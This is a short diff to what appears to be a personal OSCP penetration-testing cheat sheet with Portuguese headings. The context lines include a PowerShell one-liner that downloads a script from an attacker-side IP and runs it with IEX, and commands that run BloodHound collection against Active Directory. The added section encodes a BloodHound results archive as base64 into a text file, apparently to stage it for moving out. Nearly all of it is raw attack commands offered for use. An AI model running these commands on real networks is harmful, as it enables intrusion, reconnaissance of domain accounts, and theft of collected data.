@@ -2645,3 +2645,10 @@ IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/S
 Invoke-BloodHound -CollectionMethod All -Verbose
 Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
 ```
+##### POWERSHELL - CODIFICAR ARQUIVO COMO BASE64
+```
+$Filename = "C:\Users\student209\Desktop\blood\20230215225830_BloodHound.zip"
+$ByteArray = [System.IO.File]::ReadAllBytes($Filename);
+$Base64String = [System.Convert]::ToBase64String($ByteArray);
+Set-Content blood1.txt -Value $Base64String
+```
